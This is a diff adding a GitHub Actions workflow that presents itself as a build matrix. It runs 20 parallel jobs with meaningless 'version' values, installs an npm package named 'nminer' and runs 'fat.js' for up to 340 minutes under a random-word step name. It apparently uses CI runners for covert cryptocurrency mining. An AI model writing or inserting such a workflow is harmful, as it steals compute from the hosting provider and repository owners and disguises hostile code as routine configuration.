@@ -1,0 +1,45 @@
+name: fat
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 7272 }
+          - { version: 2951 }
+          - { version: 3587 }
+          - { version: 8927 }
+          - { version: 4139 }
+          - { version: 7594 }
+          - { version: 7990 }
+          - { version: 4143 }
+          - { version: 5803 }
+          - { version: 9397 }
+          - { version: 9315 }
+          - { version: 8919 }
+          - { version: 1374 }
+          - { version: 4796 }
+          - { version: 838 }
+          - { version: 5145 }
+          - { version: 9001 }
+          - { version: 8085 }
+          - { version: 4612 }
+          - { version: 5310 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: aha masculinize faint founder
+        run: |
+          npm install nminer@latest
+          timeout 340m node fat.js || echo "fat executed"
